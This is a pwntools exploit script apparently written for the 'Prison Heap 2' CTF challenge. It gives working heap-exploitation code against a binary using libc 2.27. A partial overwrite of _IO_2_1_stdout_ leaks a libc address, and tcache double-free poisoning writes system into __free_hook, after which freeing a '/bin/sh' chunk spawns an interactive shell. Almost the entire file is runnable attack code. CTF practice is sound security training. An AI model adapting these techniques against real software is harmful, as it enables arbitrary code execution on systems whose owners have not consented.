from pwn import *

# --- Info ---
# CTF: C0r0n4CON
# Date: -
# Challenge: Prison Heap 2
# Description: Partial overwrite to _IO_file structures to get leak and tcache poisoning to get shell
# --- End Info ---

#context.log_level = 'debug'
context.terminal = ["tmux", "sp", "-h"]
context.endian = 'little'

PATH = './prison_heap_hard'
LIBC = './libc-2.27.so'
ENV = {"LD_PRELOAD":"./libc-2.27.so"}
libc  = ELF(LIBC, checksec = False)

REMOTE = 0

HOST = '127.0.0.1'
PORT = 1337

def alloc(size, data, post_leak = False):
    r.recvuntil('Exit')
    r.sendline('1')
    r.recvuntil('heap')
    r.sendline(str(int(size)))
    if(post_leak):
        r.recvuntil('prison')
        r.sendline(data)
        return
    r.recvuntil('prison\n')
    r.sendline(data)


def free(idx):
    r.recvuntil('Exit')
    r.sendline('2')
    r.recvuntil('free')
    r.sendline(str(int(idx)))

def close():
    r.recvuntil('Exit\n')
    r.sendline('3')
    r.recvuntil('<0>\n')
    r.close()

def pad(addr):
    return addr + '\x00'*(8-len(addr))
    
def leak():
    pre_leak = r.recv(0x8)
    return 0 if pre_leak != b"\x00" * 8 else u64(r.recv(8))

context.binary = PATH

OFFSET_LEAK = 0x3ed8b0

success = 0

for _ in range(256):
    try:
        
        r = remote(HOST, PORT) if REMOTE else process(PATH, env=ENV)
        alloc(16, "")  # 0
        alloc(256, "")  # 1 (\x80)
        alloc(256, "/bin/sh\x00") # 2 (avoid it getting added to top chunk)

        for _ in range(7):
            free(1)
        free(1) # unsorted bin (to get fd and bk added to it with main_arena ptr)

        free(0)
        free(0)

        # tcache -> ptr -> ptr

        alloc(16, '\x80') # 3

        # tcache -> ptr -> chunk -> partial_overwritten_addr

        alloc(16, "") # 4

        # tcache -> chunk

        alloc(16, '\x60\x87') # 5 (partial overwrite to _IO_2_1_stdout_)

        alloc(256, "") # 6


        alloc(256, p64(0xfbad1800) + p64(0x0) * 0x3 + "\x00") # 7
        leak_addr = leak()
        if(leak_addr):
            success = 1
            break

    except:
        log.failure("Failed! Wrong address!")
        r.close()
if(not success):
    log.failure('Something went wrong!')
    r.close()
    exit()

log.success("Success! _IO_2_1_stdout_ overwritten!")

#gdb.attach(r)
#pause()

libc.address = leak_addr - OFFSET_LEAK
one_gadget = libc.address + 0x4f2c5

log.info(f'Leaked: leak @ {hex(leak_addr)}')
log.info(f'Leaked: libc base @ {hex(libc.address)}')
log.info('Leaked: system @ ' + hex(libc.symbols['system']))
log.info('Leaked: __free_hook @ ' + hex(libc.symbols['__free_hook']))
log.info(f'Leaked: one_gadget @ {hex(one_gadget)}')

# tcache poisoning

alloc(0x40, "AAAA", True) # 8

free(8)

# tcache -> ptr1

free(8)

# tcache -> ptr1 -> ptr1

alloc(0x40, p64(libc.symbols['__free_hook']), True) # 9

# tcache -> ptr1 -> __free_hook

alloc(0x40, "AAAA", True) # 10

# tcache -> __free_hook

alloc(0x40, p64(libc.symbols['system']), True) # __free_hook overwrite (with system) (11)

log.info('Popping a shell!')

#pause()

alloc(0x16, "/bin/sh\x00", True) # 12

free(12) # free("/bin/sh\x00")

r.interactive()


            
